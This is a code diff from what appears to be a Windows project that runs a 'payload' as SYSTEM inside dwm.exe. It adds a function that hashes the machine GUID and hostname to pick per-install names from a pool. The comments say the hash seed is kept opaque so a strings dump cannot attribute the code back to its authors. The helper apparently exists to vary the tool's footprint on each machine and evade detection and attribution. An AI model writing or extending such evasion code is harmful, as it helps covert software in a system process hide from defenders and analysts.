@@ -205,6 +205,73 @@ done:
     return ok;
 }
 
+/* Deterministic per-install pool-index picker — see header doc. */
+unsigned cu_installsalt_index(const char *salt, unsigned n) {
+    if (n == 0) return 0;
+    if (n == 1) return 0;
+
+    /* Inputs: MachineGuid (32 bytes of hex+dashes) + hostname (per-host,
+     * ≤ 64 chars). Both are stable per install AND identical across
+     * launcher (interactive user) and payload (SYSTEM in dwm.exe), so
+     * every callsite converges on the same index on the same machine.
+     * Deliberately omitting GetUserName — inside dwm.exe it's always
+     * SYSTEM which erases user-side entropy. Salt discriminates callsites. */
+    char mg[128] = {0};
+    HKEY k;
+    if (RegOpenKeyExA(HKEY_LOCAL_MACHINE,
+        "SOFTWARE\\Microsoft\\Cryptography", 0,
+        KEY_READ | KEY_WOW64_64KEY, &k) == ERROR_SUCCESS) {
+        DWORD sz = sizeof(mg), type = 0;
+        RegQueryValueExA(k, "MachineGuid", NULL, &type, (LPBYTE)mg, &sz);
+        RegCloseKey(k);
+    }
+
+    char host[128] = {0};
+    DWORD hlen = sizeof(host);
+    GetComputerNameA(host, &hlen);
+
+    uint8_t digest[32];
+    int ok = 0;
+
+    BCRYPT_ALG_HANDLE alg;
+    if (NT_SUCCESS(BCryptOpenAlgorithmProvider(&alg, BCRYPT_SHA256_ALGORITHM, NULL, 0))) {
+        BCRYPT_HASH_HANDLE h;
+        if (NT_SUCCESS(BCryptCreateHash(alg, &h, NULL, 0, NULL, 0, 0))) {
+            /* Domain-separator seed — deliberately opaque so a strings
+             * dump can't attribute this back to us. Any string works as
+             * long as it stays stable across releases (rotating the
+             * seed changes every install's picked index). */
+            static const char seed[] = "isalt-v1|";
+            BCryptHashData(h, (PUCHAR)seed, sizeof(seed) - 1, 0);
+            if (mg[0])   BCryptHashData(h, (PUCHAR)mg,   (ULONG)strlen(mg),   0);
+            BCryptHashData(h, (PUCHAR)"|", 1, 0);
+            if (host[0]) BCryptHashData(h, (PUCHAR)host, (ULONG)strlen(host), 0);
+            BCryptHashData(h, (PUCHAR)"|", 1, 0);
+            if (salt && salt[0]) {
+                BCryptHashData(h, (PUCHAR)salt, (ULONG)strlen(salt), 0);
+            }
+            if (NT_SUCCESS(BCryptFinishHash(h, digest, 32, 0))) ok = 1;
+            BCryptDestroyHash(h);
+        }
+        BCryptCloseAlgorithmProvider(alg, 0);
+    }
+
+    uint32_t low;
+    if (ok) {
+        low = ((uint32_t)digest[0])
+            | ((uint32_t)digest[1] <<  8)
+            | ((uint32_t)digest[2] << 16)
+            | ((uint32_t)digest[3] << 24);
+    } else {
+        /* SHA256 unavailable — fall back to (pid ^ tick) so we still
+         * return a valid index. Not per-install-stable in this branch,
+         * but that only trips on catastrophic BCrypt failure which
+         * means far bigger problems than an unstable window class. */
+        low = (uint32_t)GetCurrentProcessId() ^ GetTickCount();
+    }
+    return (unsigned)(low % n);
+}
+
 int cu_wrap_decrypt(const uint8_t *cipher, size_t cipher_len,
                     uint8_t *out, size_t outmax, size_t *out_len) {
     if (!cipher || !out || cipher_len < 29) return 0;
